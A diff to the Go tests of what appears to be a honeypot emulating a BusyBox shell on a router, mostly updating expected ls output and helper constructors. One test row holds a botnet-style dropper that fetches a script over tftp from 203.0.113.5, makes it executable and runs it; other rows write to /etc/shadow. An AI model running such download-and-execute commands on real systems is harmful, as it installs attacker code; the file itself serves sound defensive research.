@@ -10,6 +10,22 @@ import (
 	"time"
 )
 
+// noColors is the Telnet login shell with ls's colors off (LS_COLORS=none, as a user can set it), so the
+// screens in the tests stay readable; the colors themselves are tested in TestLsTerminal.
+func noColors() *Shell {
+	sh := NewShell()
+	sh.vars["LS_COLORS"], sh.exported["LS_COLORS"] = "none", true
+	return sh
+}
+
+// noTerminal is the login shell with its output going to no terminal, like the oracle's (its output
+// goes to a file): what the rows copied from the real ash were measured in.
+func noTerminal() *Shell {
+	sh := NewShell()
+	sh.terminal = false
+	return sh
+}
+
 // Each row = a line sent by the attacker + what must appear on screen.
 func TestRun(t *testing.T) {
 	tests := []struct {
@@ -73,7 +89,7 @@ func TestRun(t *testing.T) {
 	}
 
 	for _, tt := range tests {
-		got, _, _ := NewShell().Run(tt.line)
+		got, _, _ := noColors().Run(tt.line)
 		if got != tt.want {
 			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
 		}
@@ -138,7 +154,7 @@ func TestRedirects(t *testing.T) {
 			"busybox tftp -g -r x.sh 203.0.113.5 >/dev/null 2>&1; chmod 777 x.sh; sh x.sh >/dev/null 2>&1", "", 2},
 	}
 	for _, tt := range tests {
-		if got, code, _ := NewShell().Run(tt.line); got != tt.want || code != tt.code {
+		if got, code, _ := noColors().Run(tt.line); got != tt.want || code != tt.code {
 			t.Errorf("Run(%q)\n got: %q, exit code %d\nwant: %q, exit code %d", tt.line, got, code, tt.want, tt.code)
 		}
 	}
@@ -310,7 +326,7 @@ func TestShellBuiltins(t *testing.T) {
 		{`: > /tmp/f; ls /tmp/f`, "/tmp/f\n", 0},
 	}
 	for _, tt := range tests {
-		if got, code, _ := NewShell().Run(tt.line); got != tt.want || code != tt.code {
+		if got, code, _ := noTerminal().Run(tt.line); got != tt.want || code != tt.code {
 			t.Errorf("Run(%q)\n got: %q, exit code %d\nwant: %q, exit code %d", tt.line, got, code, tt.want, tt.code)
 		}
 	}
@@ -756,7 +772,7 @@ func TestLs(t *testing.T) {
 	tests := []struct{ line, want string }{
 		{"ls /", "bin   dev   etc   home  lib   mnt   proc  root  sbin  sys   tmp   usr   var\n"},
 		{"ls -1 /var", "log\nrun\nspool\ntmp\nwww\n"},
-		{"ls --color=auto /var", "log    run    spool  tmp    www\n"},
+		{"ls --color=auto /var", blue("log") + "    " + blue("run") + "    " + blue("spool") + "  " + blue("tmp") + "    " + blue("www") + "\n"}, // --color=auto beats LS_COLORS on a terminal
 		{"ls /nope /etc/hostname", "ls: /nope: No such file or directory\n/etc/hostname\n"},
 		{"ls /var/run /etc/hostname", "/etc/hostname\n\n/var/run:\ndropbear.pid  lighttpd.pid\n"},
 		{"ls /var/run /var/log", "/var/log:\nmessages\n\n/var/run:\ndropbear.pid  lighttpd.pid\n"},
@@ -769,9 +785,11 @@ func TestLs(t *testing.T) {
 
 		// -l: firmware files from 2020 (older than 6 months -> year), /tmp /var /dev /proc from boot,
 		// the attacker's files from "now"
-		{"ls -la", "drwxr-xr-x    2 root     root            40 Jun  4  2020 .\n" +
+		{"ls -la", "total 0\n" + // (1 + the entries' 512-byte blocks) / 2; directories take none
+			"drwxr-xr-x    2 root     root            40 Jun  4  2020 .\n" +
 			"drwxr-xr-x   15 root     root           300 Jun  4  2020 ..\n"},
-		{"ls -l /var/run", "-rw-r--r--    1 root     root             4 Nov 18 09:15 dropbear.pid\n" +
+		{"ls -l /var/run", "total 8\n" + // two files of one 4KB page each
+			"-rw-r--r--    1 root     root             4 Nov 18 09:15 dropbear.pid\n" +
 			"-rw-r--r--    1 root     root             4 Nov 18 09:15 lighttpd.pid\n"},
 		{"ls -l /bin/sh /bin/busybox /dev/null",
 			"-rwxr-xr-x    1 root     root        278412 Jun  4  2020 /bin/busybox\n" +
@@ -784,19 +802,20 @@ func TestLs(t *testing.T) {
 			"dr-xr-xr-x    3 root     root             0 Nov 18 09:15 /proc\n" + // its directory: sys
 				"drwxrwxrwt    2 root     root            40 Nov 18 09:15 /tmp\n"},
 		{nippon + "ls -la",
-			"drwxrwxrwt    3 root     root            80 Nov 18 09:15 .\n" +
+			"total 4\n" +
+				"drwxrwxrwt    3 root     root            80 Nov 18 09:15 .\n" +
 				"drwxr-xr-x   15 root     root           300 Jun  4  2020 ..\n" +
 				"-rw-r--r--    1 root     root             5 Nov 20 10:30 .nippon\n" +
 				"drwxr-xr-x    2 root     root            40 Nov 20 10:30 d\n"},
 		{"ls -l /var/www/login.cgi", // a program; /var/www is on the firmware, not in RAM like /var/run
 			"-rwxr-xr-x    1 root     root         13764 Jun  4  2020 /var/www/login.cgi\n"},
 		{"ls -l /etc/dropbear", // Dropbear's format: 140 bytes, 141 for a private number with its top bit set
-			"-rw-------    1 root     root           140 Jun  4  2020 dropbear_ecdsa_host_key\n"},
+			"total 4\n-rw-------    1 root     root           140 Jun  4  2020 dropbear_ecdsa_host_key\n"},
 		{"echo x >> /etc/shadow; ls -l /etc/shadow", // overwriting keeps the mode, the date changes
 			"-rw-------    1 root     root           303 Nov 20 10:30 /etc/shadow\n"},
 	}
 	for _, tt := range tests {
-		got, _, _ := NewShell().Run(tt.line)
+		got, _, _ := noColors().Run(tt.line)
 		if got != tt.want {
 			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
 		}
@@ -811,12 +830,12 @@ func TestColumns(t *testing.T) {
 		"busybox   echo      kill      mv        sh        uname\n" +
 		"cat       false     login     ps        sleep\n" +
 		"chmod     grep      ls        pwd       touch\n"
-	if got := columns(names); got != want {
+	if got := columns(names, names, false); got != want {
 		t.Errorf("columns:\n%s\nwant:\n%s", got, want)
 	}
 
 	long := strings.Repeat("x", 80) // wider than the terminal -> one name per line
-	if got := columns([]string{long, "y"}); got != long+"\ny\n" {
+	if got := columns([]string{long, "y"}, []string{long, "y"}, false); got != long+"\ny\n" {
 		t.Errorf("a name wider than the terminal: %q", got)
 	}
 }
@@ -956,7 +975,7 @@ func TestMinerCommands(t *testing.T) {
 			"* * * * * one\n* * * * * two\n"}, // a bot that comes twice keeps its first job too
 	}
 	for _, tt := range tests {
-		got, _, _ := NewShell().Run(tt.line)
+		got, _, _ := noColors().Run(tt.line)
 		if got != tt.want {
 			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
 		}
@@ -1072,12 +1091,12 @@ func TestHoneytokens(t *testing.T) {
 		{"grep user /etc/ppp/peers/isp", "user \"2210417553\"\n"}, // the same account in both pppd files
 		{"ps | grep hostapd", "  362 root      1840 S    /usr/sbin/hostapd -B /etc/hostapd.conf\n"},
 		{"ps | grep pppd", "  377 root      1216 S    /usr/sbin/pppd call isp\n"},
-		{"ls -l /etc/ppp", "-rw-------    1 root     root           108 Jun  4  2020 chap-secrets\n" +
+		{"ls -l /etc/ppp", "total 4\n-rw-------    1 root     root           108 Jun  4  2020 chap-secrets\n" +
 			"drwxr-xr-x    2 root     root            60 Jun  4  2020 peers\n"},
 		{"ls /usr/lib/pppd/2.4.7", "rp-pppoe.so\n"}, // the plugin named in /etc/ppp/peers/isp
 	}
 	for _, tt := range tests {
-		got, _, _ := NewShell().Run(tt.line)
+		got, _, _ := noColors().Run(tt.line)
 		if got != tt.want {
 			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
 		}
